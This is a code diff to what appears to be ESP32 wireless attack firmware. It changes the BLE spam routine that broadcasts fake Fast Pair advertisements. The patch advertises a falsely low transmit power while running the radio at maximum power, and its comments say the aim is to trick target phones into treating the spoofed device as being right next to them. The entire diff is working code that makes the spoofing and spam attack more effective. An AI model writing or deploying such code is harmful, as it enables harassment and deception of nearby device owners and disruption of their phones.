@@ -346,7 +346,10 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
 
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
-        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+        // Fake "very close" distance: advertise low TX power while radio runs at max.
+        // Receiver computes path loss = adv_tx - RSSI; a low advertised TX vs strong
+        // RSSI makes the target infer the spoofed device is right next to it.
+        AdvData_Raw[i++] = (int8_t)(-80 + (rand() % 41)); // -80 .. -40 dBm
 
         #ifndef HAS_NIMBLE_2
           AdvData.addData(std::string((char *)AdvData_Raw, 14));
@@ -384,7 +387,7 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
 
         AdvData_Raw[i++] = 0x02;  // TX Power level length
         AdvData_Raw[i++] = 0x0A;  // TX Power level type
-        AdvData_Raw[i++] = 0x00;  // TX Power level value
+        AdvData_Raw[i++] = (int8_t)(-80 + (rand() % 41));  // fake "close" range -80..-40 dBm
 
         // Manufacturer specific data based on your hex dump
         AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
@@ -4746,6 +4749,7 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         generateRandomMac(smac);
         esp_base_mac_addr_set(smac);
         NimBLEDevice::init("");
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // max radio TX (+9 dBm) for strong RSSI
         NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         NimBLEServer *pServer = NimBLEDevice::createServer();
         pAdvertising = pServer->getAdvertising();
@@ -4823,6 +4827,7 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         generateRandomMac(smac);
         esp_base_mac_addr_set(smac);
         NimBLEDevice::init("");
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // max radio TX (+9 dBm) for strong RSSI
         NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         NimBLEServer *pServer = NimBLEDevice::createServer();
         pAdvertising = pServer->getAdvertising();
